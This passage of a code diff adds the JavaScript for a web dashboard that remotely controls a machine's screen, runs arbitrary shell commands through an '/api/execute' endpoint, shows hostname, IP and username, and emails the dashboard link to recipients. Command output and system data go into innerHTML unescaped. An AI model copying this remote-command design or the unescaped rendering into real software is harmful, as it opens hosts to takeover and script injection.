+            overlay.addEventListener('touchstart', handleStart, { passive: false });
+            overlay.addEventListener('touchmove', handleMove, { passive: false });
+            overlay.addEventListener('touchend', handleEnd);
+        }
+        
+        function showTouchIndicator(clientX, clientY) {
+            const container = document.getElementById('screenContainer');
+            const indicator = document.createElement('div');
+            indicator.className = 'touch-indicator';
+            indicator.style.left = clientX + 'px';
+            indicator.style.top = clientY + 'px';
+            container.appendChild(indicator);
+            
+            setTimeout(() => indicator.remove(), 350);
+        }
+        
+        async function loadScreenInfo() {
+            try {
+                const response = await fetch('/api/screen/info');
+                const info = await response.json();
+                
+                // Update screen size
+                if (info.primary) {
+                    screenWidth = info.primary.width;
+                    screenHeight = info.primary.height;
+                    document.getElementById('screenSize').textContent = `Resolution: ${screenWidth} x ${screenHeight}`;
+                }
+                
+                // Build info display
+                let html = `
+                    <div class="info-item">
+                        <div class="label">Monitors</div>
+                        <div class="value">${info.monitors ? info.monitors.length : 0}</div>
+                    </div>
+                `;
+                
+                if (info.primary) {
+                    html += `
+                        <div class="info-item">
+                            <div class="label">Resolution</div>
+                            <div class="value">${info.primary.width} x ${info.primary.height}</div>
+                        </div>
+                    `;
+                }
+                
+                if (info.tools) {
+                    html += `
+                        <div class="info-item">
+                            <div class="label">xdotool</div>
+                            <div class="value">${info.tools.xdotool ? '✓ Installed' : '✗ Missing'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="label">ImageMagick</div>
+                            <div class="value">${info.tools.imagemagick ? '✓ Installed' : '✗ Missing'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="label">System</div>
+                            <div class="value">${info.system || 'Unknown'}</div>
+                        </div>
+                    `;
+                }
+                
+                document.getElementById('screenInfo').innerHTML = html;
+                
+            } catch (error) {
+                document.getElementById('screenInfo').innerHTML = `
+                    <div class="info-item">
+                        <div class="label">Error</div>
+                        <div class="value">Failed to load</div>
+                    </div>
+                `;
+            }
+        }
+        
+        // Setup screen interaction on load
+        document.addEventListener('DOMContentLoaded', () => {
+            setupScreenInteraction();
+        });
+        
+        // Commands
+        async function loadCommands() {
+            try {
+                const response = await fetch('/api/commands');
+                const commands = await response.json();
+                
+                const tbody = document.querySelector('#commandsTable tbody');
+                tbody.innerHTML = commands.map(c => `
+                    <tr>
+                        <td style="font-family: monospace;">${c.command}</td>
+                        <td style="max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-family: monospace;">
+                            ${c.output ? c.output.substring(0, 100) : 'No output'}
+                        </td>
+                        <td>${new Date(c.executed_at).toLocaleString()}</td>
+                        <td><button class="btn btn-secondary" onclick="viewCommandOutput(${c.id})">View</button></td>
+                    </tr>
+                `).join('');
+            } catch (error) {
+                console.error('Error loading commands:', error);
+            }
+        }
+        
+        async function viewCommandOutput(id) {
+            try {
+                const response = await fetch(`/api/commands`);
+                const commands = await response.json();
+                const cmd = commands.find(c => c.id === id);
+                
+                if (cmd) {
+                    document.getElementById('logDetail').textContent = `$ ${cmd.command}\n\n${cmd.output || 'No output'}`;
+                    document.getElementById('logModal').classList.add('active');
+                }
+            } catch (error) {
+                console.error('Error viewing command:', error);
+            }
+        }
+        
+        async function execCommand(command) {
+            try {
+                const response = await fetch('/api/execute', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ command: command })
+                });
+                
+                const data = await response.json();
+                const outputDiv = document.getElementById('commandOutput');
+                outputDiv.style.display = 'block';
+                outputDiv.textContent = `$ ${command}\n\n${data.output || 'No output'}`;
+                loadCommands();
+            } catch (error) {
+                console.error('Error executing command:', error);
+            }
+        }
+        
+        function execCustomCommand() {
+            const command = document.getElementById('customCommand').value;
+            if (command) {
+                execCommand(command);
+                document.getElementById('customCommand').value = '';
+            }
+        }
+        
+        // System
+        async function loadSystemInfo() {
+            try {
+                const response = await fetch('/api/system');
+                const system = await response.json();
+                
+                document.getElementById('detailedSystemInfo').innerHTML = `
+                    <div class="info-item">
+                        <div class="label">Hostname</div>
+                        <div class="value">${system.hostname || 'Unknown'}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">Operating System</div>
+                        <div class="value">${system.os_info || 'Unknown'}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">IP Address</div>
+                        <div class="value">${system.ip_address || 'Unknown'}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">Username</div>
+                        <div class="value">${system.username || 'Unknown'}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">Last Updated</div>
+                        <div class="value">${system.captured_at ? new Date(system.captured_at).toLocaleString() : 'N/A'}</div>
+                    </div>
+                `;
+            } catch (error) {
+                console.error('Error loading system info:', error);
+            }
+        }
+        
+        // Settings
+        async function sendDashboardUrl() {
+            const url = document.getElementById('dashboardUrl').value;
+            if (!url) {
+                alert('Please enter a URL');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/send-url', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url })
+                });
+                
+                const data = await response.json();
+                alert(data.success ? 'URL sent to all recipients' : 'Failed to send URL');
+            } catch (error) {
+                console.error('Error sending URL:', error);
+            }
+        }
+        
+        async function sendTestEmail() {
+            const email = document.getElementById('testEmail').value;
+            if (!email) {
+                alert('Please enter an email address');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/test-email', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email })
+                });
+                
+                const data = await response.json();
+                alert(data.success ? 'Test email sent' : 'Failed to send test email');
+            } catch (error) {
+                console.error('Error sending test email:', error);
+            }
+        }
+        
+        async function cleanupLogs() {
+            const days = document.getElementById('cleanupDays').value;
+            if (!confirm(`Delete logs older than ${days} days?`)) return;
+            
+            try {
+                const response = await fetch(`/api/cleanup?days=${days}`, { method: 'POST' });
+                const data = await response.json();
+                alert(`Deleted ${data.deleted} old logs`);
+            } catch (error) {
+                console.error('Error cleaning up logs:', error);
+            }
+        }
+        
+        // Modal
+        function closeModal() {
+            document.getElementById('logModal').classList.remove('active');
+        }
+        
+        // Load dashboard on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            loadDashboard();
+        });
+        
+        // Close modal on outside click
+        document.getElementById('logModal').addEventListener('click', (e) => {
+            if (e.target.id === 'logModal') closeModal();
+        });
+    </script>
+</body>
+</html>
